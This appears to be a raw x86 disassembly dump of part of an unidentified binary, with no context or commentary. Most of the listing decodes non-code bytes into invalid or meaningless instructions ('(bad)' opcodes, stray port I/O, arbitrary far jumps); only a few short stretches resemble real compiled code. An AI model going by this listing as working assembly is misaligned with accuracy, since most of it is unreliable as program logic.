  40bce6:	mov    ds:0xfb1eebf8,al
  40bceb:	lock nop
  40bced:	dec    eax
  40bcee:	ror    BYTE PTR [ebp-0x23ad3377],cl
  40bcf4:	push   ebx
  40bcf5:	dec    esp
  40bcf6:	fs add eax,0x263693f8
  40bcfc:	mov    bh,0x4c
  40bcfe:	pmuludq mm1,QWORD PTR [ecx+0x1d]
  40bd02:	mov    ebx,0x328ffe72
  40bd07:	pop    esp
  40bd08:	loopne 0x40bcf9
  40bd0a:	sub    dl,dl
  40bd0c:	push   ebp
  40bd0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd0e:	sbb    BYTE PTR [esi-0x2e97b0ad],0x35
  40bd15:	in     al,dx
  40bd16:	out    0x4e,al
  40bd18:	mov    dl,0xa3
  40bd1a:	xor    eax,0xd5f4e3ab
  40bd1f:	sbb    edx,DWORD PTR [edi+0xb]
  40bd22:	sub    edx,DWORD PTR [edi]
  40bd24:	outs   dx,DWORD PTR ds:[esi]
  40bd25:	gs loope 0x40bd60
  40bd28:	pusha  
  40bd29:	add    esi,ecx
  40bd2b:	jo     0x40bcb4
  40bd2d:	fnstsw WORD PTR [edx+0xde053bf]
  40bd33:	repz jne 0x40bd33
  40bd36:	or     dl,ah
  40bd38:	lods   eax,DWORD PTR ds:[esi]
  40bd39:	cmp    ebx,0x40
  40bd3c:	jnp    0x40bd83
  40bd3e:	jbe    0x40bd5b
  40bd40:	div    ecx
  40bd42:	jbe    0x40bd2a
  40bd44:	cdq    
  40bd45:	call   0xbe806d77
  40bd4a:	inc    ebp
  40bd4b:	dec    ebx
  40bd4c:	xor    al,0x89
  40bd4e:	stos   BYTE PTR es:[edi],al
  40bd4f:	dec    ebx
  40bd50:	int3   
  40bd51:	and    al,0x71
  40bd53:	or     al,0x44
  40bd55:	xor    DWORD PTR [edx-0x6b],eax
  40bd58:	pushf  
  40bd59:	sahf   
  40bd5a:	mov    ch,0xbc
  40bd5c:	push   0x1fdd949f
  40bd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd62:	in     al,dx
  40bd63:	shr    DWORD PTR [eax+0x10],1
  40bd66:	(bad)  
  40bd67:	or     DWORD PTR [esp+edi*2],edi
  40bd6a:	lods   al,BYTE PTR ds:[esi]
  40bd6b:	inc    edx
  40bd6c:	xor    dh,BYTE PTR [ebx-0x748ddaf6]
  40bd72:	dec    ebp
  40bd73:	or     al,0x33
  40bd75:	mov    BYTE PTR [ebx],0xc0
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz mov ds:0xb9779372,al
  40bd90:	cld    
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bd80
  40bd98:	cmp    eax,0x821a86c
  40bd9d:	sar    DWORD PTR [edx-0x7042dc18],cl
  40bda3:	adc    BYTE PTR [eax-0x2],0xf
  40bda7:	adc    DWORD PTR [edx+0x0],edx
  40bdaa:	mov    ah,0x8e
  40bdac:	add    eax,0x9b3edbac
  40bdb1:	mov    ebx,DWORD PTR [edx+esi*4]
  40bdb4:	into   
  40bdb5:	cdq    
  40bdb6:	push   ebp
  40bdb7:	aad    0x5e
  40bdb9:	stos   DWORD PTR es:[edi],eax
  40bdba:	js     0x40bde7
  40bdbc:	or     edi,DWORD PTR [esp+edx*8]
  40bdbf:	and    dh,cl
  40bdc1:	and    BYTE PTR ds:0x3d7c758d,dl
  40bdc7:	sbb    DWORD PTR [ebx],ecx
  40bdc9:	shl    DWORD PTR [ebx],cl
  40bdcb:	lahf   
  40bdcc:	nop
  40bdcd:	xor    eax,0x7c2650c5
  40bdd2:	or     ebx,DWORD PTR [ebx+eax*4-0x2ca29d87]
  40bdd9:	pop    ebp
  40bdda:	mov    ebx,0xadf8f130
  40bddf:	in     eax,0x7
  40bde1:	push   ss
  40bde2:	or     bl,al
  40bde4:	xchg   ebp,eax
  40bde5:	xchg   esi,eax
  40bde6:	repz pop esp
  40bde8:	mov    dl,0x1
  40bdea:	xchg   esi,eax
  40bdeb:	idiv   DWORD PTR [edx+ebp*4-0x36]
  40bdef:	sub    al,0xc7
  40bdf1:	mov    ebx,0x3497d93
  40bdf6:	xor    eax,0x9616e65a
  40bdfb:	xchg   esi,eax
  40bdfc:	dec    edi
  40bdfd:	push   edi
  40bdfe:	or     eax,DWORD PTR [edx]
  40be00:	xchg   edi,eax
  40be01:	sar    ebp,0x72
  40be04:	mov    ah,0x8d
  40be06:	sub    ch,BYTE PTR [ebx-0x6baa85ac]
  40be0c:	lea    ebp,[edx+0x48]
  40be0f:	xor    DWORD PTR [edi-0x2d],ebx
  40be12:	push   0x58874b22
  40be17:	mov    esp,0xe818aff7
  40be1c:	cs jge 0x40be89
  40be1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be20:	out    dx,al
  40be21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be22:	mov    ah,0xf1
  40be24:	out    dx,al
  40be25:	mov    esi,DWORD PTR [esi+edx*1]
  40be28:	jmp    0x442f:0x8ac61286
  40be2f:	xchg   ecx,eax
  40be30:	xor    BYTE PTR [edi-0x7e],cl
  40be33:	and    BYTE PTR [edx],ch
  40be35:	jb     0x40bdbf
  40be37:	and    DWORD PTR [ebx-0x7e5f533],esp
  40be3d:	and    ch,BYTE PTR [esi-0x429db697]
  40be43:	push   ebp
  40be44:	push   edx
  40be45:	out    0xa7,eax
  40be47:	add    bh,bh
  40be49:	mov    ebp,0x8c8908c3
  40be4e:	xchg   DWORD PTR [ebp-0x77],eax
  40be51:	cwde   
  40be52:	outs   dx,DWORD PTR ds:[esi]
  40be53:	outs   dx,DWORD PTR ds:[esi]
  40be54:	stc    
  40be55:	dec    BYTE PTR [ebp+eax*1-0x23]
  40be59:	cmp    DWORD PTR [ebx-0x6],ebp
  40be5c:	(bad)  
  40be5d:	mov    dh,0x13
  40be5f:	mov    dl,0xd5
  40be61:	jae    0x40be9c
  40be63:	mov    bl,0x4e
  40be65:	xchg   edx,eax
  40be66:	cli    
  40be67:	inc    ebp
  40be68:	out    0x71,eax
  40be6a:	es lods eax,DWORD PTR ss:[esi]
  40be6d:	inc    esi
  40be6e:	shr    DWORD PTR [ebp-0x20],0xd2
  40be72:	jle    0x40be17
  40be74:	pop    eax
  40be75:	js     0x40bef0
  40be77:	xchg   DWORD PTR [ebp-0x43aa3c99],esp
  40be7d:	(bad)  
  40be7e:	sbb    eax,0xb4085c8a
  40be83:	push   ebp
  40be84:	mov    ss,WORD PTR [eax-0x46]
  40be87:	jecxz  0x40be1a
  40be89:	cmp    dl,BYTE PTR [edx]
  40be8b:	scas   eax,DWORD PTR es:[edi]
  40be8c:	int    0xe3
  40be8e:	mov    eax,ds:0xdaa9e86a
  40be93:	test   al,0xdd
  40be95:	inc    edx
  40be96:	inc    esp
  40be97:	ret    
  40be98:	repz cli 
  40be9a:	cmp    eax,0xad166515
  40be9f:	or     dh,BYTE PTR [edi]
  40bea1:	sub    BYTE PTR [ebx-0x6484e601],cl
  40bea7:	push   eax
  40bea8:	adc    eax,0x550abec0
  40bead:	dec    esp
  40beae:	fidiv  DWORD PTR [edx]
  40beb0:	sahf   
  40beb1:	mov    edi,ecx
  40beb3:	mov    esi,0x814dffe7
  40beb8:	cmp    DWORD PTR [ecx+0x69],0xf045c9f6
  40bebf:	push   ebp
  40bec0:	sbb    DWORD PTR [esi-0x1a],edi
  40bec3:	loop   0x40be90
  40bec5:	ss push ebx
  40bec7:	inc    BYTE PTR [ebx-0xb18ee2a]
  40becd:	out    dx,al
  40bece:	sub    ecx,esp
  40bed0:	mov    ch,0xcb
  40bed2:	mov    ds:0x2ea2464c,eax
  40bed7:	popf   
  40bed8:	or     edx,esp
  40beda:	push   0x2d
  40bedc:	stos   BYTE PTR es:[edi],al
  40bedd:	inc    edx
  40bede:	xor    al,0x6b
  40bee0:	ds pop esp
  40bee2:	int    0xbd
  40bee4:	and    al,0x7d
  40bee6:	xchg   edi,eax
  40bee7:	dec    eax
  40bee8:	(bad)  
  40bee9:	call   0x2142:0xa740ac54
  40bef0:	aas    
  40bef1:	add    BYTE PTR [edx],ch
  40bef3:	in     eax,dx
  40bef4:	jge    0x40bf41
  40bef6:	jmp    0xbae:0xa071dd7f
  40befd:	repz aas 
  40beff:	mov    ch,0x43
  40bf01:	inc    esp
  40bf02:	jo     0x40bf6c
  40bf04:	fisubr WORD PTR [ebx-0x1e379b1b]
  40bf0a:	cmp    edx,esi
  40bf0c:	jmp    0x4579:0x35a63946
  40bf13:	ds jae 0x40bf42
  40bf16:	mov    sp,0xe70a
  40bf1a:	pop    edx
  40bf1b:	(bad)  
  40bf1c:	sbb    dl,BYTE PTR [ecx-0x3607edd4]
  40bf22:	ss enter 0x5f36,0xc3
  40bf27:	out    0x53,eax
  40bf29:	out    dx,al
  40bf2a:	mov    dl,ch
  40bf2c:	fs in  eax,dx
  40bf2e:	dec    edi
  40bf2f:	sbb    al,0xd5
  40bf31:	sbb    eax,0x33c262f1
  40bf36:	ins    BYTE PTR es:[edi],dx
  40bf37:	pop    ebp
  40bf38:	lds    ebx,FWORD PTR [ebp-0x2b]
  40bf3b:	aam    0x56
  40bf3d:	pop    ebp
  40bf3e:	push   0xffffffce
  40bf40:	mov    al,cl
  40bf42:	call   0xb3d4:0x283f1c2
  40bf49:	jp     0x40bf86
  40bf4b:	dec    esi
  40bf4c:	adc    dl,0x5e
  40bf4f:	in     al,dx
  40bf50:	dec    edx
  40bf51:	nop
  40bf52:	rol    BYTE PTR [eax+esi*4+0x55],cl
  40bf56:	aaa    
  40bf57:	push   edx
  40bf58:	pop    edi
  40bf59:	mov    es,WORD PTR [esi]
  40bf5b:	test   eax,0xeaf5e4f8
  40bf60:	add    esi,esi
  40bf62:	test   ecx,ecx
  40bf64:	(bad)  
  40bf65:	pusha  
  40bf66:	pop    ss
  40bf67:	shl    DWORD PTR ds:0x61291d8c,1
  40bf6d:	inc    edi
  40bf6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf6f:	ins    DWORD PTR es:[edi],dx
  40bf70:	retf   
  40bf71:	dec    edx
  40bf72:	dec    ecx
  40bf73:	inc    esp
  40bf74:	popf   
  40bf75:	into   
  40bf76:	gs int 0x60
  40bf79:	and    eax,0x40944e9
  40bf7e:	push   0x71
  40bf80:	fs mov ebx,0x83fa3496
  40bf86:	pop    ebx
  40bf87:	ret    
  40bf88:	push   ebp
  40bf89:	sbb    dl,BYTE PTR [ecx-0x25]
  40bf8c:	inc    eax
  40bf8d:	shl    edi,0x47
  40bf90:	fs js  0x40bfbd
  40bf93:	ins    BYTE PTR es:[edi],dx
  40bf94:	or     edi,esp
  40bf96:	fs and eax,0x6c154f98
  40bf9c:	std    
  40bf9d:	repnz push ecx
  40bf9f:	add    BYTE PTR [ecx+0x36],cl
  40bfa2:	xor    ebp,ebp
  40bfa4:	popa   
  40bfa5:	daa    
  40bfa6:	sahf   
  40bfa7:	mov    edi,0xea985fb5
  40bfac:	ror    BYTE PTR [esi-0x3f],1
  40bfaf:	ret    
  40bfb0:	stc    
  40bfb1:	mul    edx
  40bfb3:	add    ch,BYTE PTR [ebx]
  40bfb5:	sub    DWORD PTR [edi+eiz*4+0x114e6765],0x2b79e65d
  40bfc0:	inc    eax
  40bfc1:	adc    dl,al
  40bfc3:	sub    DWORD PTR [ebx+0x71d0aaa9],esp
  40bfc9:	push   gs
  40bfcb:	and    bh,bh
  40bfcd:	dec    ecx
  40bfce:	push   cs
  40bfcf:	xchg   edx,eax
  40bfd0:	cwde   
  40bfd1:	jae    0x40c034
  40bfd3:	jns    0x40bfb9
  40bfd5:	sbb    al,BYTE PTR [edi-0x7]
  40bfd8:	test   al,0xf5
  40bfda:	push   ebx
  40bfdb:	jge    0x40bf84
  40bfdd:	cmp    eax,0xcb5c0d46
  40bfe2:	jae    0x40c061
  40bfe4:	add    edi,DWORD PTR [ebp+0x4d4b7d2]
  40bfea:	fcomp  QWORD PTR [edx-0x2]
  40bfed:	lock jg 0x40c00c
  40bff0:	and    ah,BYTE PTR [edi+edx*4-0xf99214a]
  40bff7:	pop    edi
  40bff8:	sbb    BYTE PTR [esi],dh
  40bffa:	pop    ebx
  40bffb:	xor    DWORD PTR [ebp-0x73],0x4932b63f
  40c002:	pusha  
  40c003:	push   esi
  40c004:	mov    ecx,0xdef56341
  40c009:	xchg   edi,eax
  40c00a:	sub    al,0xc8
  40c00c:	clc    
  40c00d:	jmp    0xd4c21927
  40c012:	push   edi
  40c013:	ja     0x40c06b
  40c015:	adc    al,0xe2
  40c017:	sbb    cl,BYTE PTR [esi+ebx*1+0x207ce87e]
  40c01e:	mov    ds:0xff023a5e,eax
  40c023:	mov    cl,0x35
  40c025:	ret    
  40c026:	call   0x372b:0xcef5aa9d
  40c02d:	out    dx,eax
  40c02e:	rcr    BYTE PTR [esi+0x5ace72dc],0xdd
  40c035:	in     al,dx
  40c036:	pusha  
  40c037:	xchg   esp,eax
  40c038:	sub    eax,0x2e93c5b7
  40c03d:	cmp    BYTE PTR [esi-0xb],bl
  40c040:	and    ecx,DWORD PTR [ebp-0x2c]
  40c043:	cwde   
  40c044:	fstp   QWORD PTR [edx+edi*4]
  40c047:	aad    0xbc
  40c049:	lock push es
  40c04b:	pop    ds
  40c04c:	dec    esp
  40c04d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c04e:	mov    ebp,0xfde625f5
  40c053:	sbb    DWORD PTR [edi],esi
  40c055:	mov    edx,0xbba812ca
  40c05a:	push   0xffffffc5
  40c05c:	jb     0x40c030
  40c05e:	test   DWORD PTR [eax+0x28d81e46],ecx
  40c064:	jo     0x40c099
  40c066:	test   DWORD PTR [esi-0x4c],ecx
  40c069:	retf   0x1f2c
  40c06c:	mov    edx,0x2b99773e
  40c071:	cmp    bh,BYTE PTR [eax-0x307345b8]
  40c077:	cli    
  40c078:	and    eax,DWORD PTR [eax-0x5aa77ec6]
  40c07e:	scas   al,BYTE PTR es:[edi]
  40c07f:	(bad)  
  40c080:	ins    BYTE PTR es:[edi],dx
  40c081:	add    al,0x69
  40c083:	sbb    al,0x2d
  40c085:	repz dec esp
  40c087:	mov    dh,0x2f
  40c089:	repnz mov dh,0x1d
  40c08c:	jnp    0x40c05c
  40c08e:	les    ebp,FWORD PTR [ecx+0x69df65ee]
  40c094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c096:	ins    DWORD PTR es:[edi],dx
  40c097:	mov    eax,ds:0x4cfc9d9b
  40c09c:	fld    QWORD PTR [ebp+ecx*4+0x323879e8]
  40c0a3:	pop    ebx
  40c0a4:	xor    ah,bl
  40c0a6:	pop    edi
  40c0a7:	sbb    eax,DWORD PTR [edi+0x10f20f09]
  40c0ad:	push   eax
  40c0ae:	aad    0x47
  40c0b0:	pop    esp
  40c0b1:	loop   0x40c069
  40c0b3:	add    BYTE PTR [ebp+eiz*4-0x5fda04eb],al
  40c0ba:	sar    DWORD PTR [edx],cl
  40c0bc:	popa   
  40c0bd:	xchg   edi,eax
  40c0be:	(bad)  
  40c0bf:	stc    
  40c0c0:	sub    DWORD PTR [esp+ecx*4],ebp
  40c0c3:	(bad)  
  40c0c4:	jnp    0x40c0d6
  40c0c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	hlt    
  40c104:	sbb    ecx,ecx
  40c106:	fild   QWORD PTR [ecx-0x5]
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c0eb
  40c110:	push   ebp
  40c111:	pushf  
  40c112:	jg     0x40c0bd
  40c114:	jnp    0x40c0cd
  40c116:	xor    eax,edi
  40c118:	ror    al,0x86
  40c11b:	push   ebx
  40c11c:	in     al,0x43
  40c11e:	add    DWORD PTR [ebx-0x1514f6d7],ecx
  40c124:	or     eax,eax
  40c126:	xor    DWORD PTR [ecx-0x5],0x6b926466
  40c12d:	pop    eax
  40c12e:	int    0xa8
  40c130:	stos   DWORD PTR es:[edi],eax
  40c131:	pusha  
  40c132:	push   esi
  40c133:	or     ecx,DWORD PTR [eax+0x62]
  40c136:	add    BYTE PTR [edx],dl
  40c138:	mov    ?,WORD PTR [esi+edi*1+0x391a3eb0]
  40c13f:	dec    ecx
  40c140:	not    BYTE PTR [ebx]
  40c142:	lock mov cl,0xa3
  40c145:	xchg   edx,eax
  40c146:	mov    DWORD PTR ds:[edi-0x47f23b04],eax
  40c14d:	into   
  40c14e:	sbb    BYTE PTR [ebx-0x6f35d19],al
  40c154:	ss (bad) 
  40c156:	push   eax
  40c157:	mov    al,0xfb
  40c159:	xor    ebp,ecx
  40c15b:	clc    
  40c15c:	in     al,0x71
  40c15e:	aaa    
  40c15f:	pop    eax
  40c160:	inc    eax
  40c161:	lock adc al,0x2c
  40c164:	hlt    
  40c165:	adc    ebp,DWORD PTR [eax+0x5d]
  40c168:	ror    ebx,cl
  40c16a:	rcl    DWORD PTR [eax+0x7c71d05b],0x17
  40c171:	dec    edi
  40c172:	xchg   al,cl
  40c174:	loope  0x40c147
  40c176:	test   eax,0x7e0c4d89
  40c17b:	test   DWORD PTR ds:0x6be64ba3,0xef2bce6d
  40c185:	and    ah,BYTE PTR [ecx+0x463504cb]
  40c18b:	sbb    ah,ch
  40c18d:	bnd jge 0x40c1d1
  40c190:	jnp    0x40c139
  40c192:	es mov al,0xfb
  40c195:	sub    bp,WORD PTR [esi+0x179e33b9]
  40c19c:	jae    0x40c1a0
  40c19e:	inc    ebx
  40c19f:	pop    esp
  40c1a0:	retf   
  40c1a1:	push   esi
  40c1a2:	sub    eax,0x3cc3e3c6
  40c1a7:	jae    0x40c16a
  40c1a9:	ins    DWORD PTR es:[edi],dx
  40c1aa:	pavgw  mm2,QWORD PTR [esi+ecx*2-0x6e]
  40c1af:	stos   BYTE PTR es:[edi],al
  40c1b0:	enter  0x1f4,0x9f
  40c1b4:	sub    BYTE PTR [ebp+0x1db486b8],0x11
  40c1bb:	jne    0x40c1ff
  40c1bd:	gs cmc 
  40c1bf:	sub    eax,DWORD PTR [edx]
  40c1c1:	sub    al,0x63
  40c1c3:	sub    BYTE PTR [ebp-0xa],dl
  40c1c6:	xor    DWORD PTR [esi+0x2e4d728c],esi
  40c1cc:	fcomp  DWORD PTR [edx]
  40c1ce:	out    dx,eax
  40c1cf:	jecxz  0x40c20d
  40c1d1:	mov    bl,0xdd
  40c1d3:	sar    DWORD PTR [esi+0x2a4e0140],cl
  40c1d9:	and    eax,0x62df5bb
  40c1de:	xchg   esp,eax
  40c1df:	sub    ebx,DWORD PTR [eax-0x5a]
  40c1e2:	and    cl,BYTE PTR [edi+0x40]
  40c1e5:	clc    
  40c1e6:	pop    ss
  40c1e7:	jl     0x40c1ce
  40c1e9:	stos   BYTE PTR es:[edi],al
  40c1ea:	sub    al,0x5e
  40c1ec:	aad    0x91
  40c1ee:	int    0x25
  40c1f0:	rol    BYTE PTR [ecx-0x6],1
  40c1f3:	mov    edx,DWORD PTR [eax+0x22]
  40c1f6:	imul   ecx,DWORD PTR [edi+0x488b39d9],0xffffff82
  40c1fd:	(bad)  
  40c1fe:	jg     0x40c249
  40c200:	jecxz  0x40c1d5
  40c202:	arpl   cx,bx
  40c204:	popf   
  40c205:	lods   al,BYTE PTR ds:[esi]
  40c206:	outs   dx,BYTE PTR ds:[esi]
  40c207:	call   0x95e2:0xa2c836ec
  40c20e:	cmp    eax,0x789dd786
  40c213:	out    dx,al
  40c214:	mov    eax,ds:0xb51325a5
  40c219:	and    BYTE PTR [eax],0xfc
  40c21c:	(bad)  
  40c21e:	dec    eax
  40c21f:	adc    DWORD PTR [edx+0x1a28a682],edi
  40c225:	int3   
  40c226:	inc    edi
  40c227:	lock mov edx,0x606c0bec
  40c22d:	jo     0x40c1cc
  40c22f:	adc    eax,0xbf921740
  40c234:	mov    BYTE PTR [edi],bl
  40c236:	mov    edi,0x73c87b3d
  40c23b:	mov    ch,0x78
  40c23d:	mov    bh,0x2d
  40c23f:	sub    DWORD PTR [edi],ebx
  40c241:	jl     0x40c298
  40c243:	into   
  40c244:	hlt    
  40c245:	lea    edi,[edi+0x46]
  40c248:	pop    esp
  40c249:	shl    DWORD PTR [edi],0xfd
  40c24c:	jno    0x40c1d8
  40c24e:	or     DWORD PTR [edi-0x55],ecx
  40c251:	shl    DWORD PTR [esi],cl
  40c253:	xchg   edi,eax
  40c254:	jne    0x40c1ef
  40c256:	mov    ch,0xa4
  40c258:	rol    DWORD PTR [edi],1
  40c25a:	sti    
  40c25b:	enter  0x1e0f,0x90
  40c25f:	(bad)  
  40c260:	loope  0x40c206
  40c262:	and    DWORD PTR [ebx],ebx
  40c264:	add    eax,0x1d9460bf
  40c269:	sar    BYTE PTR [esi-0x2cfc4356],1
  40c26f:	jmp    0xc692:0x94ad77a2
  40c276:	lea    eax,[esi-0x2c465446]
  40c27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c27d:	popf   
  40c27e:	xor    dh,BYTE PTR [ebx+0x78146558]
  40c284:	add    al,0x25
  40c286:	add    edx,DWORD PTR [ecx+0x7eef6fac]
  40c28c:	cmp    eax,0xbe5c883
  40c291:	jno    0x40c239
  40c293:	loope  0x40c287
  40c295:	leave  
  40c296:	repz add DWORD PTR [eax-0x15f590ee],0x1359b967
  40c2a1:	add    eax,0xb2e2dcab
  40c2a6:	leave  
  40c2a7:	in     eax,0x99
  40c2a9:	ror    ah,1
  40c2ab:	xchg   ecx,eax
  40c2ac:	pop    es
  40c2ad:	or     eax,0x2723cd71
  40c2b2:	cmp    DWORD PTR [ecx-0x60],edx
  40c2b5:	ret    0x2211
  40c2b8:	jle    0x40c290
  40c2ba:	xchg   ecx,eax
  40c2bb:	es jo  0x40c2f6
  40c2be:	pop    edi
  40c2bf:	jno    0x40c28d
  40c2c1:	lock lock jg 0x40c27f
  40c2c5:	xchg   ebx,eax
  40c2c6:	outs   dx,BYTE PTR ds:[esi]
  40c2c7:	fsubr  st,st(0)
  40c2c9:	mov    bl,0xea
  40c2cb:	fs test al,0x3e
  40c2ce:	inc    edi
  40c2cf:	loope  0x40c306
  40c2d1:	jl     0x40c2d8
  40c2d3:	clc    
  40c2d4:	fcomp  DWORD PTR ds:0x441d7d89
  40c2da:	ret    
  40c2db:	mov    esp,0x147d139a
  40c2e0:	or     DWORD PTR [esi-0x2ee0e154],ebp
  40c2e6:	adc    edi,edi
  40c2e8:	mov    ebp,0xf4d74c68
  40c2ed:	add    ecx,edi
  40c2ef:	xlat   BYTE PTR ds:[ebx]
  40c2f0:	adc    DWORD PTR [edx+edx*1],edi
  40c2f3:	pop    eax
  40c2f4:	ins    BYTE PTR es:[edi],dx
  40c2f5:	call   0xd20b:0xd43b4a51
  40c2fc:	xchg   BYTE PTR [ecx],dh
  40c2fe:	retf   
  40c2ff:	xchg   edx,eax
  40c300:	into   
  40c301:	(bad)  [ecx+0x1790dfe8]
  40c307:	inc    edi
  40c308:	or     ecx,ebx
  40c30a:	adc    eax,0x6d7eeb79
  40c30f:	add    ebx,ebp
  40c311:	or     bh,BYTE PTR [edi+ebp*4+0x75]
  40c315:	adc    al,0xe4
  40c317:	xchg   BYTE PTR [ebx+0x5171286a],cl
  40c31d:	adc    eax,0x6aa64c6b
  40c322:	and    ah,BYTE PTR [edx+0x2205ebb]
  40c328:	add    bh,BYTE PTR [ebx+0x76]
  40c32b:	scas   al,BYTE PTR es:[edi]
  40c32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c32d:	retf   
  40c32e:	loope  0x40c378
  40c330:	add    bh,BYTE PTR [edi]
  40c332:	mov    edx,0x2b132719
  40c337:	sbb    eax,DWORD PTR [ebx-0x24]
  40c33a:	adc    bh,BYTE PTR [ecx-0x72]
  40c33d:	dec    esi
  40c33e:	sub    esi,esi
  40c340:	xor    BYTE PTR ds:0xa64234aa,bl
  40c346:	mov    ah,dh
  40c348:	mov    edx,0x28f15cde
  40c34d:	jns    0x40c2db
  40c34f:	mov    bh,0x15
  40c351:	es call 0x3f361e5e
  40c357:	das    
  40c358:	jae    0x40c383
  40c35a:	fwait
  40c35b:	outs   dx,DWORD PTR ds:[esi]
  40c35c:	jle    0x40c30b
  40c35e:	and    bh,0x59
  40c361:	jmp    ebx
  40c363:	inc    ecx
  40c364:	adc    eax,0x2c64eefe
  40c369:	sub    al,0x77
  40c36b:	arpl   WORD PTR [ecx-0x7e],bx
  40c36e:	(bad)  [ecx-0x4af97531]
  40c374:	mov    edi,0x76864b9f
  40c379:	push   ecx
  40c37a:	jge    0x40c323
  40c37c:	xchg   esp,eax
  40c37d:	cli    
  40c37e:	add    edi,ebx
  40c380:	xor    al,0x10
  40c382:	mov    ch,0xef
  40c384:	je     0x40c30f
  40c386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c387:	dec    esp
  40c388:	mov    es,eax
  40c38a:	mov    al,ds:0xbff3ddde
  40c38f:	xor    al,0x60
  40c391:	sub    ch,bh
  40c393:	stos   DWORD PTR es:[edi],eax
  40c394:	mov    fs,WORD PTR [ecx]
  40c396:	ja     0x40c320
  40c398:	and    bl,BYTE PTR [edx*8-0x59e6ffdd]
  40c39f:	stc    
  40c3a0:	out    0x29,al
  40c3a2:	fst    st(3)
  40c3a4:	mov    dh,0x70
  40c3a6:	or     al,0x8f
  40c3a8:	iret   
  40c3a9:	sbb    esp,esi
  40c3ab:	dec    ebp
  40c3ac:	pop    es
  40c3ad:	shr    DWORD PTR [ebx+eiz*1],0xa6
  40c3b1:	outs   dx,BYTE PTR ds:[esi]
  40c3b2:	iret   
  40c3b3:	mov    edx,edx
  40c3b5:	add    ah,BYTE PTR [edx]
  40c3b7:	jl     0x40c385
  40c3b9:	xor    BYTE PTR [esi+0x62af4d0e],al
  40c3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3c0:	nop
  40c3c1:	sbb    cl,0x80
  40c3c4:	int    0xe6
  40c3c6:	clc    
  40c3c7:	loopne 0x40c380
  40c3c9:	dec    eax
  40c3ca:	dec    ecx
  40c3cb:	fist   DWORD PTR [eax]
  40c3cd:	jbe    0x40c410
  40c3cf:	mov    ch,0xd1
  40c3d1:	icebp  
  40c3d2:	add    edx,edi
  40c3d4:	jae    0x40c3df
  40c3d6:	mov    eax,0xa4b68c15
  40c3db:	inc    edi
  40c3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3dd:	outs   dx,DWORD PTR ds:[esi]
  40c3de:	call   0x1145:0x7b805303
  40c3e5:	jmp    0x40c409
  40c3e7:	add    DWORD PTR [edx+ecx*4-0x20fb570e],eax
  40c3ee:	pop    esp
  40c3ef:	sub    eax,0xa02ac65f
  40c3f4:	stos   DWORD PTR es:[edi],eax
  40c3f5:	mov    WORD PTR [eax-0x2fdd9662],?
  40c3fb:	retf   
  40c3fc:	loope  0x40c381
  40c3fe:	push   ebp
  40c3ff:	in     eax,dx
  40c400:	adc    ah,ah
  40c402:	jl     0x40c404
  40c404:	mov    bl,0x49
  40c406:	ror    ch,0xd2
  40c409:	ins    BYTE PTR es:[edi],dx
  40c40a:	adc    esp,DWORD PTR ds:0xc30c81d9
  40c410:	rcr    DWORD PTR [ebx],0x96
  40c413:	mov    DWORD PTR [edx],ecx
  40c415:	mov    dl,BYTE PTR [ebx-0x232d7412]
  40c41b:	in     al,0x56
  40c41d:	in     eax,dx
  40c41e:	mov    dl,0x15
  40c420:	fisubr WORD PTR [esi]
  40c422:	std    
  40c423:	out    0xbd,al
  40c425:	xchg   ebp,eax
  40c426:	out    0xa4,al
  40c428:	into   
  40c429:	(bad)  
  40c42a:	sub    ebp,ecx
  40c42c:	sbb    BYTE PTR [ebx+0x3e],dh
  40c42f:	imul   ebx,ebx,0xbb770c68
  40c435:	test   eax,0x8f051cee
  40c43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c43b:	or     edi,DWORD PTR [ecx-0x7b72c75d]
  40c441:	or     BYTE PTR [ebx+0x66003272],bl
  40c447:	mov    DWORD PTR [ebp-0x4],eax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
